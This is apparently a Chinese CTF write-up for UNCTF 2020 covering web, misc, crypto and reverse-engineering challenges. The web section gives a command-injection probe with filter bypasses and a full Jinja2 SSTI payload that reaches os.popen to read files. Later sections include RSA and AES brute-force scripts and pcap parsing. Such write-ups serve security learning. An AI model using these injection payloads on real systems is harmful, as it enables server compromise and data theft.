<p><img src="https://img.npfs06.top/20210405213418.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 管道符</span><br><span class="line"></span><br><span class="line">### windows 下</span><br><span class="line"></span><br><span class="line">&gt; &#96;|&#96;直接执行后面的语句</span><br><span class="line">&gt; &#96;||&#96;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&gt; &#96;&amp;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;&amp;&amp;&#96;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Linux 下</span><br><span class="line"></span><br><span class="line">&gt; &#96;;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;|&#96;直接执行后面的语句</span><br><span class="line">&gt; &#96;||&#96;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&gt; &#96;&amp;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;&amp;&amp;&#96;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<p>首先拿管道符测试下 127.0.0.1||ls</p>
<p>发现可以正确输出，不过读文件的时候发现部分字符被过滤了</p>
<p>先扫一下哪些字符被过滤了，808的这些都是被过滤了的</p>
<p><img src="https://img.npfs06.top/20210405213431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>看了下还有less没被过滤，空格用%09代替，一级级目录猜过去，一猜就中，文件名是flag，不过flag被过滤了，用下正则绕过 fla? </p>
<p>payload如下：</p>
<p><img src="https://img.npfs06.top/20210405213440.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><p>dirsearch扫目录，/login和/register</p>
<p>注册admin,登入admin,这里题目没什么限制，可以直接注册admin,刚开始还以为考点是flask_session。。。。</p>
<p>登入成功之后，回到初始页面</p>
<p>提示 /secret_route_you_do_not_know</p>
<p>到该目录，又提示 ‘guess’ the secret number </p>
<p>所以 <code> http://url//secret_route_you_do_not_know?guess=&#123;&#123;config&#125;&#125;</code></p>
<p>emmm.确定为SSTI</p>
<p>爆破下看下哪些字符被过滤</p>
<p><code>[  __   &quot;  </code>这些字符都被过滤了</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">[] 可以用gentitem绕过，getitem的用法为：__mro__[2]== __mro__.__getitem__(2)</span></span><br><span class="line"><span class="xml">__ 和 &quot;(引号)可以用|attr绕过，例：</span><span class="template-variable">&#123;&#123;()|<span class="name">attr</span>(<span class="name">request.values.name1</span>)&#125;&#125;</span><span class="xml">&amp;name1=class</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">payload:</span></span><br><span class="line"><span class="xml">?guess=</span><span class="template-variable">&#123;&#123;()|<span class="name">attr</span>(<span class="name">request.args.x1</span>)|attr(<span class="name">request.args.x2</span>)|attr(<span class="name">request.args.x3</span>)()|attr(<span class="name">request.args.x4</span>)(<span class="name">117</span>)|attr(<span class="name">request.args.x5</span>)|attr(<span class="name">request.args.x6</span>)|attr(<span class="name">request.args.x4</span>)(<span class="name">request.args.x7</span>)|attr(<span class="name">request.args.x4</span>)(<span class="name">request.args.x8</span>)(<span class="name">request.args.x9</span>)&#125;&#125;</span><span class="xml">&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat ./flag.txt&#x27;).read()</span></span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210405213453.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h2><p><img src="https://img.npfs06.top/20210405213504.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>有个url进去看下，是b站的，评论第一条就是flag<br><img src="https://img.npfs06.top/20210405213512.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h2><p>没啥好说的，直接拿存档编辑器，改下金币，到‘ 出题人商店 ’ 买下第三个hint3 就是flag</p>
<h2 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h2><p>emmm Ook编码<br>“就这” 和 “不会吧” 全部替换成 Ook  ，倒过来的问号改成正过来的问号<br><img src="https://img.npfs06.top/20210405213523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>解密网址：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
<p><img src="https://img.npfs06.top/20210405213538.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h2><p>验证码连着输对十次，就可以得到flag</p>
<h2 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h2><p>后缀改成zip , 这个目录下 \list\xl\sharedStrings.xml</p>
<p><img src="https://img.npfs06.top/20210405213551.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>base64解码就是flag </p>
<h2 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h2><blockquote>
<p>strings flag</p>
</blockquote>
<h2 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h2><p>emmmm. 直接找个正常的二维码，补一下就好</p>
<h2 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ-IMAGE"></a>EZ-IMAGE</h2><p><img src="https://img.npfs06.top/20210405213559.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405213608.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405213642.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h2><p>audacity-2.4.2打开 频谱图，对照表得出电话号码</p>
<p><img src="https://img.npfs06.top/20210405213713.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405213728.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>15975384265</p>
<p>压缩包解密，得到的音频拿audacity-2.4.2打开 频谱图，如下</p>
<p><img src="https://img.npfs06.top/20210405213739.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>Tupper自我指涉公式生成器,解密即可，脚本网址：<a href="https://github.com/HanSaloZu/Tupper-s-self-referential-formula-in-Python">https://github.com/HanSaloZu/Tupper-s-self-referential-formula-in-Python</a></p>
<p><a href="https://keelyhill.github.io/tuppers-formula/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BE%97%E5%88%B0">https://keelyhill.github.io/tuppers-formula/这个网站可以直接得到</a></p>
<p><img src="https://img.npfs06.top/20210405213801.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="零"><a href="#零" class="headerlink" title="零"></a>零</h2><p><a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>网址直接解码即可</p>
<h2 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h2><blockquote>
<p>john shadow.txt</p>
</blockquote>
<p>得到密码123456</p>
<p>MD5 32未小写加密即可</p>
<h2 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h2><p>（1）使用tshark 命令把pcap的数据提取并去除空行到<code>usbdata.txt</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>
<p>(2) 提取出来的数据可能会带冒号，也可能不带,如果不带冒号，用以下脚本加冒号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>
<p>加冒号类似于这样:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span>:<span class="number">00</span>:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">01</span>:<span class="number">00</span></span><br><span class="line"><span class="attribute">00</span>:ff:<span class="number">02</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure>
<p>(3) 获取坐标内容</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sniffer.py</span></span><br><span class="line">nums = []</span><br><span class="line"><span class="built_in">keys</span> = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">result</span>=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> <span class="built_in">keys</span>:</span><br><span class="line">    x = int(<span class="built_in">line</span>[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">    y = int(<span class="built_in">line</span>[<span class="number">5</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt;<span class="number">115</span> :</span><br><span class="line">        y -=<span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = int(<span class="built_in">line</span>[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span> : <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">        <span class="built_in">result</span>.<span class="built_in">write</span>(str(posx)+<span class="string">&#x27; &#x27;</span>+str(-posy)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">keys</span>.<span class="built_in">close</span>()</span><br><span class="line"><span class="built_in">result</span>.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>
<p>(4 ) 用gnuplot软件来画出鼠标生成的图像</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">gnuplot</span> -e <span class="string">&quot;plot &#x27;result.txt&#x27; &quot;</span> -p</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210405213814.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h2><p>010editor打开，最下面，base64解密，解出来的字符串逆序，改后缀为zip</p>
<p><img src="https://img.npfs06.top/20210405213823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>暴力破解</p>
<p><img src="https://img.npfs06.top/20210405213836.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="ET-MSG"><a href="#ET-MSG" class="headerlink" title="ET-MSG"></a>ET-MSG</h2><p>转成30 X 80 的图</p>
<p><img src="https://img.npfs06.top/20210405213847.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>按阿雷西博 1-10的加密规则，转成数字。如下：（注那个8改成0）</p>
<p><img src="https://img.npfs06.top/20210405213859.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>7进制转ASCII即可</p>
<p><img src="https://img.npfs06.top/20210405213914.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h2><p>培根密码</p>
<p><img src="https://img.npfs06.top/20210405213923.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>5个一组对出来就好了</p>
<p>peigenhenyouyingyang</p>
<p>结果最后的flag格式有点迷，提交了好多次才对</p>
<p>unctf{PEIGENHENYOUYINGYANG}</p>
<h2 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h2><p>e很大，维纳攻击</p>
<p><img src="https://img.npfs06.top/20210405213932.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405213945.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy-rsa"></a>easy-rsa</h2><p>p=(a+b)/2</p>
<p>q=(a-b)/2</p>
<p>求出pq后，可以求m</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">求m</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269</span></span><br><span class="line">q=<span class="number">155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899</span></span><br><span class="line"></span><br><span class="line">n = p * q  <span class="comment">#模数</span></span><br><span class="line">d = <span class="number">13520637333215938186701232387959186078192441834430646200152017496580083015894693608744446669957196067379816242548412185148719678858906249430631086296059347471406865114774824686655919643954375513480029176520925196420025095437582404880108633026550155505640286905930669447727266167475328689082873003809052013145641561953548574050510799399063204788021266291024788348241346451907588463054320379080780429068578299089418923223030202618570767162875599171107099044497918583654800248238807175687675702792006125086389940138212608569298856353395124065366005586641202732989813698557545059249478652073299085605820622861917775089649</span></span><br><span class="line"></span><br><span class="line">c =<span class="number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">print(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210405214005.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="https://img.npfs06.top/20210405213956.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="wing"><a href="#wing" class="headerlink" title="wing"></a>wing</h2><p><img src="https://img.npfs06.top/20210405214022.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>wingding2字体，对出来就好了</p>
<p>unctf{wingdings_is_incomprehensible}</p>
<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>写个脚本爆破下就好了</p>
<p><img src="https://img.npfs06.top/20210405214032.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">pt = <span class="string">b&#x27;UNCTF2020_Enjoy_Crypto~&#x27;</span></span><br><span class="line">val = <span class="built_in">len</span>(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span> - val)</span><br><span class="line">    print(<span class="string">&quot;pt==&quot;</span>,pt)</span><br><span class="line">yan= unhexlify(<span class="string">b&#x27;01a4e429e76db218fa0eb18f03ec69c9200a2362d8b4d7ea46170ce698389bbd&#x27;</span>)</span><br><span class="line">print(yan)</span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p1 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span>.join(p1)</span><br><span class="line">    key1 = <span class="string">&quot;0000000000000&quot;</span>+key</span><br><span class="line">    cipher1 = AES.new(key=key1.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    c1 = cipher1.encrypt(pt)</span><br><span class="line">    table[c1] = key1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p2 <span class="keyword">in</span> itertools.product(printable, repeat=<span class="number">3</span>):</span><br><span class="line">    key = <span class="string">&quot;&quot;</span>.join(p2)</span><br><span class="line">    key2 = key+<span class="string">&quot;0000000000000&quot;</span></span><br><span class="line">    cipher2 = AES.new(key=key2.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    c2 = cipher2.decrypt(yan)</span><br><span class="line">    <span class="comment"># print(&quot;c2==&quot;,c2)</span></span><br><span class="line">    <span class="keyword">if</span> c2 <span class="keyword">in</span> table:</span><br><span class="line">        key1 = table[c2]</span><br><span class="line">        print(key1, key2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;196cc94c2d685beb54beeaa14c1dc0a6f3794d65fca0d1a1274515166e4255ab367383092e42d774992f74bc138faaad&quot;</span></span><br><span class="line">flag = unhexlify(flag)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> [key2, key1]:</span><br><span class="line">    cipher = AES.new(key=key.encode(), mode=AES.MODE_ECB)</span><br><span class="line">    flag = cipher.decrypt(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pt== <span class="string">b&#x27;UNCTF2020_Enjoy_Crypto~\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x01\xa4\xe4)\xe7m\xb2\x18\xfa\x0e\xb1\x8f\x03\xeci\xc9 \n#b\xd8\xb4\xd7\xeaF\x17\x0c\xe6\x988\x9b\xbd&#x27;</span></span><br><span class="line">done creating lookup table</span><br><span class="line">0000000000000W&lt;&amp; <span class="number">0</span>/i0000000000000</span><br><span class="line"><span class="string">b&#x27;&gt;\xfe4\x00\x96\x00\x13\\\xa9\xd8\xbb\xf8\xa2D\x8a\x1e\xbe\xec\xc2[\t\xf0\xe6]\xddO;#\xb8l\xc1\xaf\xd7&amp;\xde\x1c\x94\x9az\x01\x92b\x83\xd3/\x8c\xf4P&#x27;</span></span><br><span class="line"><span class="string">b&#x27;unctf&#123;524e314a-5843-3030-5939-333230323541&#125;\x05\x05\x05\x05\x05&#x27;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import itertools</span><br><span class="line"><span class="selector-tag">a</span> = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="selector-tag">b</span> = (<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">c = itertools<span class="selector-class">.product</span>(<span class="selector-tag">a</span>,b)</span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> c:</span><br><span class="line">    print elem</span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">&#x27;C&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>往下翻</p>
<p>在str1那 ctrl+u</p>
<p><img src="https://img.npfs06.top/20210405214053.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>到了sub_401550函数这里</p>
<p><img src="https://img.npfs06.top/20210405214103.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>下一个函数  sub_4015DC</p>
<p>选择数字 +R 即可转化为ascii</p>
<p><img src="https://img.npfs06.top/20210405214115.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>General Introductory of Database System</title>
    <url>/2021/06/26/mysql%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E9%87%8D%E7%82%B9/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c4ca3c6ba2cac782c9b7fffaaebd170e980cd336a0009efdc7e03b8ea4493d77"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
